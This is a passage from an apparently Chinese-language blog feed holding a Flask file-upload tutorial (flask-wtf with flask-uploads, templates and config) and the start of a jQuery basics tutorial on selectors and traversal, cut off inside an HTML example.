class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># validate_on_submit 自动判断是否是POST请求,并通过验证后返回True</span> <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># 通过 form 对象就可以拿到 前端表单中的 `photo 对象的数据</span>     f<span class="token operator">=</span>form<span class="token punctuation">.</span>photo<span class="token punctuation">.</span>data     filename<span class="token operator">=</span>secure_filename<span class="token punctuation">(</span>f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>     f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">,</span>info<span class="token operator">=</span><span class="token string">'sucess'</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">,</span>info<span class="token operator">=</span><span class="token string">'filed'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># GET请求的模板文件</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>upload.html</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>photo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>{{ info }}   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>flask-wtf</code>上传文件还可以和<code>flask-upload</code> 一起使用.</p></blockquote><h3 id="4-结合-flask-upload-上传文件"><a href="#4-结合-flask-upload-上传文件" class="headerlink" title="4.结合 flask-upload 上传文件"></a>4.结合 <code>flask-upload</code> 上传文件</h3><blockquote><p>代码参考:<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T16</code></p><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""flask-wtf 和 flask-upload结合上传文件"""</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>request<span class="token keyword">from</span> flask_uploads <span class="token keyword">import</span> UploadSet<span class="token punctuation">,</span>configure_uploads<span class="token punctuation">,</span>patch_request_class<span class="token punctuation">,</span>IMAGES<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> flask_wtf<span class="token punctuation">.</span>file <span class="token keyword">import</span> FileField<span class="token punctuation">,</span>FileAllowed<span class="token punctuation">,</span>FileRequired<span class="token keyword">import</span> config<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> Lengthapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 实例化 UploadSet</span>images<span class="token operator">=</span> UploadSet<span class="token punctuation">(</span><span class="token string">'IMAGES'</span><span class="token punctuation">,</span>IMAGES<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 注册到app</span>configure_uploads<span class="token punctuation">(</span>app<span class="token punctuation">,</span>images<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 限制大小</span>patch_request_class<span class="token punctuation">(</span>app<span class="token punctuation">,</span><span class="token number">32</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 设置验证</span><span class="token keyword">class</span> <span class="token class-name">UploadForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span> photo <span class="token operator">=</span> FileField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>FileAllowed<span class="token punctuation">(</span>images<span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'only images'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                               FileRequired<span class="token punctuation">(</span><span class="token string">'no files'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> description <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 设置路由</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/upload/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> form <span class="token operator">=</span> UploadForm<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># POST路由</span> <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># 拿到上传的文件</span>     f <span class="token operator">=</span> form<span class="token punctuation">.</span>photo<span class="token punctuation">.</span>data     <span class="token comment" spellcheck="true"># if f == request.files['photo']:</span>     <span class="token comment" spellcheck="true">#     print('1')</span>     <span class="token comment" spellcheck="true"># else:</span>     <span class="token comment" spellcheck="true">#     print('0')</span>     <span class="token comment" spellcheck="true"># 安全名称</span>     filename <span class="token operator">=</span> images<span class="token punctuation">.</span>save<span class="token punctuation">(</span>f<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#return render_template('upload.html',info=form.errors)</span>     <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'show'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">'filed'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># GET路由</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/upload/&lt;filename>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span> url<span class="token operator">=</span>images<span class="token punctuation">.</span>url<span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'show.html'</span><span class="token punctuation">,</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>name<span class="token operator">=</span>filename<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>upload.html</code></p><pre class="line-numbers language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>photo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>             描述信息         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> {{ info }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>show.html</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ name }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>config.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> osDEBUG<span class="token operator">=</span><span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD<span class="token operator">=</span><span class="token boolean">True</span>Dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>UPLOADED_IMAGES_DEST<span class="token operator">=</span>Dir<span class="token operator">+</span><span class="token string">'/uploads/'</span><span class="token comment" spellcheck="true">#UPLOADED_IMAGES_ALLOW=IMAGES</span>WTF_CSRF_ENABLED <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Flask-WTF </tag>
            
            <tag> wtforms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery学习</title>
      <link href="/posts/36060.html"/>
      <url>/posts/36060.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-21/1600701881479-10296.png" alt="10296"></p><h1 id="jQuery基础"><a href="#jQuery基础" class="headerlink" title="jQuery基础"></a>jQuery基础</h1><h2 id="jQuery简介"><a href="#jQuery简介" class="headerlink" title="jQuery简介"></a>jQuery简介</h2><h3 id="1-什么是jQuery"><a href="#1-什么是jQuery" class="headerlink" title="1.什么是jQuery"></a>1.什么是jQuery</h3><blockquote><p><code>jQuery</code>是目前使用最广泛的<code>javascript</code>函数库.</p><p><code>jQuery</code>的版本分为1.x系列和2.x,3.x系列,1.x系列兼容低版本的浏览器,2.x、3.x系列放弃支持低版本浏览器,目前使用最多的是1.x系列的.</p><p><code>jQuery</code>的口号和愿望 <code>Write Less, Do More</code>.</p><p>官网:<code>https://jquery.com/</code></p></blockquote><h3 id="2-加载jQuery"><a href="#2-加载jQuery" class="headerlink" title="2.加载jQuery"></a>2.加载jQuery</h3><blockquote><p>可以把<code>jQuery</code> 下载到本地使用,也可以在线加载网络的在线资源.比如<code>https://www.bootcdn.cn/jquery/</code>.</p><p>使用时,只需要加载到文件中即可.</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">    <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>    <script>        // 原生JavaScript        window.onload = function() {            // statement        }        // jQuery        $(document).ready(function() {            // statement        });        // 简写        $(function() {            // statement        });    </script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-jQuery语法"><a href="#3-jQuery语法" class="headerlink" title="3.jQuery语法"></a>3.jQuery语法</h3><blockquote><p><code>jQuery</code> 是通过选取<code>html</code>元素,并对选取的元素进行某些操作.</p><p>基础语法是</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// $:jQuery关键字</span><span class="token comment" spellcheck="true">// selector: 查询的html元素</span><span class="token comment" spellcheck="true">// action要执行的操作.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>jQuery</code> 大大的简化了原生<code>JavaScript</code> 语法,比如上面的例子,<code>jQuery</code> 的入口函数更加简洁.而且<code>window.onload</code> 必须等待网页全部加载完毕后才能执行,而<code>jQuery</code> 是<code>HTML</code> 的所有标签加载完毕后就执行了,速度要快很多.并且可以执行很多次.</p></blockquote><h2 id="jQuery-选择器"><a href="#jQuery-选择器" class="headerlink" title="jQuery 选择器"></a><code>jQuery</code> 选择器</h2><blockquote><p><code>jQuery</code> 选择器运行对<code>HTML</code> 元素组或单个元素进行操作.</p><p>选择器基于已经存在的<code>CSS选择器</code> ,可以基于元素的<code>id</code>,类,类型,属性,属性值等等做选择器,除此之外还存在一些自定义的选择器.</p><p>选择器都是以美元符号开头<code>$()</code></p></blockquote><h3 id="1-基于css-选择器"><a href="#1-基于css-选择器" class="headerlink" title="1.基于css 选择器"></a>1.基于<code>css</code> 选择器</h3><blockquote><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$(document)  // 选择整个文档对象$('li')  // 选择所有的 li  元素$('#myid')  // 基于id选择器$('.myclass')  // 基于类选择器$('input[name=first]') // 选择 name 属性为 first 的input元素$('#myid1 li span')  // 选择id 为myid1 的元素下的所有 li 下的 span 元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-对选择集进行修饰过滤"><a href="#2-对选择集进行修饰过滤" class="headerlink" title="2.对选择集进行修饰过滤"></a>2.对选择集进行修饰过滤</h3><blockquote><p>类似<code>css</code> 的伪类</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#box1 li:first'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 选择id 为box1 的元素下的第一个 li</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#box1 li:odd'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 选择id 为box1 的元素下的奇数行</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#box1 li:eq(2)'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// eq 从0 开始,选择 id 为box1 下的第三个 li</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#box1 li:gt(2)'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// gt 从0 开始,选择id 为 box1 下的前三个之后的 li (> ,&lt;)的英文缩写</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'# box1 :input'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 选择表单中的input元素</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'div:visible'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 选择可见的 div元素</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-选择集函数筛选"><a href="#3-选择集函数筛选" class="headerlink" title="3.选择集函数筛选"></a>3.选择集函数筛选</h3><blockquote><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$('div').has('p')   // 选择包含 p 元素的 div 元素$('div').not('.myclass')  // 选择class 不等于 myclass的div元素$('div').filter('.myclass') // 选择class 等于 myclass 的div元素$('div').first()  // 选择第一个 div 元素$('div').eq(5)  // 从0 开始,选择第六个 div元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-选择集转移"><a href="#4-选择集转移" class="headerlink" title="4.选择集转移"></a>4.选择集转移</h3><blockquote><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$('div').prev()   // 选择 div元素前面的第一个元素$('div').prevAll()   // 选择 div元素前面的所有同辈元素$('div').next(); //选择div元素后面的第一个元素$('div').nextAll() //查找当前元素之后所有的同辈元素$('div').closest('form'); //选择离div最近的那个form父元素$('div').parent(); //选择div的父元素$('div').children(); //选择div的所有子元素$('div').siblings(); //选择div的同级元素$('div').find('.myClass'); //选择div内的class等于myClass的元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h3><blockquote><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>jQuery选择器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#div01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#div01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.myClass1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                    <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'white'</span><span class="token punctuation">,</span>                    <span class="token string">'background-color'</span><span class="token punctuation">:</span> <span class="token string">'gold'</span><span class="token punctuation">,</span>                    <span class="token string">'font-size'</span><span class="token punctuation">:</span> <span class="token string">'300%'</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#div02 li:first'</span><span class="token 